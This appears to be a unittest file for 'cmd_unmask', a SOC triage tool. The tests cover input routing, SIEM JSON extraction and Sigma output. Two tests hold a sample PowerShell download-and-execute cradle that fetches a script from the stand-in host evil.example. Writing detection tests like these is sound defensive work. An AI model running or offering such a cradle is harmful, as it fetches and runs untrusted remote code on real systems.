"""Tests for Zero-Flag Input Routing and Auto-SIEM Clipboard Ingestion."""

from __future__ import annotations

import io
import json
import os
import tempfile
import unittest
from contextlib import redirect_stdout
from unittest.mock import patch

from cmd_unmask.cli import build_parser, main as cli_main


class _FakePipeStdin(io.StringIO):
    def isatty(self) -> bool:
        return False


class TestZeroFlagInputRouting(unittest.TestCase):
    """Verify positional target auto-detect, stdin pipe, and empty TTY clipboard default."""

    def test_positional_file_path_routes_to_file_ingestion(self) -> None:
        with tempfile.TemporaryDirectory() as tmpdir:
            fpath = os.path.join(tmpdir, "alerts.jsonl")
            with open(fpath, "w", encoding="utf-8") as fh:
                fh.write(json.dumps({"CommandLine": "whoami /priv"}) + "\n")

            buf = io.StringIO()
            with redirect_stdout(buf):
                rc = cli_main([fpath, "--format", "json"])
            self.assertEqual(rc, 0)
            data = json.loads(buf.getvalue())
            self.assertEqual(data["original_command"], "whoami /priv")

    def test_positional_command_string_routes_to_single_command_triage(self) -> None:
        buf = io.StringIO()
        with redirect_stdout(buf):
            rc = cli_main(["ipconfig /all", "--no-color"])
        self.assertEqual(rc, 0)
        self.assertIn("ipconfig /all", buf.getvalue())

    def test_piped_stdin_routes_without_flags(self) -> None:
        buf = io.StringIO()
        with (
            patch("sys.stdin", _FakePipeStdin("hostname\n")),
            redirect_stdout(buf),
        ):
            rc = cli_main(["--no-color"])
        self.assertEqual(rc, 0)
        self.assertIn("hostname", buf.getvalue())

    def test_empty_tty_invocation_defaults_to_clipboard(self) -> None:
        buf = io.StringIO()
        with (
            patch("sys.stdin.isatty", return_value=True),
            patch("cmd_unmask.cli.get_clipboard_text", return_value="whoami /all"),
            patch("builtins.input", side_effect=AssertionError("Should not prompt input()")),
            redirect_stdout(buf),
        ):
            rc = cli_main(["--no-color"])
        self.assertEqual(rc, 0)
        self.assertIn("whoami /all", buf.getvalue())

    def test_empty_tty_invocation_with_empty_clipboard_returns_1(self) -> None:
        buf = io.StringIO()
        err = io.StringIO()
        with (
            patch("sys.stdin.isatty", return_value=True),
            patch("cmd_unmask.cli.get_clipboard_text", return_value="   "),
            redirect_stdout(buf),
            patch("sys.stderr", err),
        ):
            rc = cli_main(["--no-color"])
        self.assertEqual(rc, 1)

    def test_explicit_cmd_flag_precedence(self) -> None:
        buf = io.StringIO()
        with redirect_stdout(buf):
            rc = cli_main(["-c", "echo explicit", "--no-color"])
        self.assertEqual(rc, 0)
        self.assertIn("echo explicit", buf.getvalue())


class TestAutoSiemClipboardAndStdin(unittest.TestCase):
    """Verify automatic SIEM JSON/JSONL extraction from clipboard/stdin and safe fallback."""

    def test_clipboard_sysmon_json_extracts_command_and_lineage(self) -> None:
        siem_event = json.dumps(
            {
                "CommandLine": "powershell.exe -NoP -Command Get-Date",
                "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
                "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            }
        )
        buf = io.StringIO()
        with (
            patch("sys.stdin.isatty", return_value=True),
            patch("cmd_unmask.cli.get_clipboard_text", return_value=siem_event),
            redirect_stdout(buf),
        ):
            rc = cli_main(["--format", "json"])
        self.assertEqual(rc, 0)
        data = json.loads(buf.getvalue())
        self.assertEqual(data["original_command"], "powershell.exe -NoP -Command Get-Date")
        self.assertIn("WINWORD.EXE", data["parent_image"])
        self.assertIn("powershell.exe", data["image"])
        self.assertEqual(data["severity"], "MEDIUM")

    def test_stdin_jsonl_extracts_multiple_siem_records(self) -> None:
        jsonl_input = (
            json.dumps({"CommandLine": "ipconfig /all", "Image": "ipconfig.exe"})
            + "\n"
            + json.dumps({"CommandLine": "whoami /all", "ParentImage": "w3wp.exe", "Image": "whoami.exe"})
            + "\n"
        )
        buf = io.StringIO()
        with (
            patch("sys.stdin", _FakePipeStdin(jsonl_input)),
            redirect_stdout(buf),
        ):
            rc = cli_main(["--format", "jsonl"])
        self.assertEqual(rc, 0)
        rows = [json.loads(line) for line in buf.getvalue().strip().splitlines()]
        self.assertEqual(len(rows), 2)
        self.assertEqual(rows[0]["original_command"], "ipconfig /all")
        self.assertEqual(rows[1]["parent_image"], "w3wp.exe")

    def test_explicit_parent_override_on_siem_clipboard(self) -> None:
        siem_event = json.dumps(
            {
                "CommandLine": "powershell.exe -NoP -Command Get-Date",
                "ParentImage": "explorer.exe",
                "Image": "powershell.exe",
            }
        )
        buf = io.StringIO()
        with (
            patch("sys.stdin.isatty", return_value=True),
            patch("cmd_unmask.cli.get_clipboard_text", return_value=siem_event),
            redirect_stdout(buf),
        ):
            rc = cli_main(["--parent", "winword.exe", "--format", "json"])
        self.assertEqual(rc, 0)
        data = json.loads(buf.getvalue())
        self.assertEqual(data["parent_image"], "winword.exe")

    def test_malformed_json_and_powershell_scriptblock_fallback(self) -> None:
        for raw_payload in ("{ Write-Host 'hello' }", "{not valid json", "[array_like_literal"):
            buf = io.StringIO()
            with (
                patch("sys.stdin.isatty", return_value=True),
                patch("cmd_unmask.cli.get_clipboard_text", return_value=raw_payload),
                redirect_stdout(buf),
            ):
                rc = cli_main(["--format", "json"])
            self.assertEqual(rc, 0)
            data = json.loads(buf.getvalue())
            self.assertEqual(data["original_command"], raw_payload)


class TestSmartTriageDefaultsAndGroupedHelp(unittest.TestCase):
    """Verify auto-copy, auto-Sigma interactive defaults, opt-out flags, JSON purity, and grouped --help."""

    def test_grouped_help_contains_three_sections(self) -> None:
        help_text = build_parser().format_help()
        self.assertIn("Common Triage", help_text)
        self.assertIn("Output & Detection", help_text)
        self.assertIn("Benchmark & Advanced", help_text)

    def test_interactive_tty_does_not_auto_copy_unless_copy_note_passed(self) -> None:
        copied: list[str] = []
        buf1 = io.StringIO()
        with (
            patch("cmd_unmask.cli.set_clipboard_text", side_effect=lambda txt: copied.append(txt) or True),
            redirect_stdout(buf1),
            patch.object(buf1, "isatty", return_value=True),
        ):
            rc1 = cli_main(["-c", "ipconfig /all", "--no-color"])
        self.assertEqual(rc1, 0)
        self.assertEqual(copied, [])

        copied.clear()
        buf2 = io.StringIO()
        with (
            patch("cmd_unmask.cli.set_clipboard_text", side_effect=lambda txt: copied.append(txt) or True),
            redirect_stdout(buf2),
            patch.object(buf2, "isatty", return_value=True),
        ):
            rc2 = cli_main(["-c", "ipconfig /all", "--no-color", "--copy-note"])
        self.assertEqual(rc2, 0)
        self.assertEqual(len(copied), 1)
        self.assertIn("[SOC TRIAGE NOTE", copied[0])

    def test_non_benign_pretty_sigma_is_strictly_opt_in(self) -> None:
        mal_cmd = "powershell -c IEX(New-Object Net.WebClient).DownloadString('http://evil.example/a.ps1')"
        buf1 = io.StringIO()
        with redirect_stdout(buf1), patch.object(buf1, "isatty", return_value=True):
            rc1 = cli_main(["-c", mal_cmd, "--no-color"])
        self.assertEqual(rc1, 0)
        self.assertNotIn("logsource:", buf1.getvalue())

        buf2 = io.StringIO()
        with redirect_stdout(buf2), patch.object(buf2, "isatty", return_value=True):
            rc2 = cli_main(["-c", mal_cmd, "--no-color", "--sigma"])
        self.assertEqual(rc2, 0)
        self.assertIn("logsource:", buf2.getvalue())
        self.assertIn("detection:", buf2.getvalue())

    def test_json_and_jsonl_stdout_remain_pure(self) -> None:
        mal_cmd = "powershell -c IEX(New-Object Net.WebClient).DownloadString('http://evil.example/a.ps1')"
        buf_json = io.StringIO()
        with redirect_stdout(buf_json):
            rc_json = cli_main(["-c", mal_cmd, "--format", "json"])
        self.assertEqual(rc_json, 0)
        parsed = json.loads(buf_json.getvalue())
        self.assertIn("severity", parsed)

        buf_jsonl = io.StringIO()
        with redirect_stdout(buf_jsonl):
            rc_jsonl = cli_main(["-c", mal_cmd, "--format", "jsonl"])
        self.assertEqual(rc_jsonl, 0)
        parsed_line = json.loads(buf_jsonl.getvalue().strip())
        self.assertIn("severity", parsed_line)


if __name__ == "__main__":
    unittest.main()
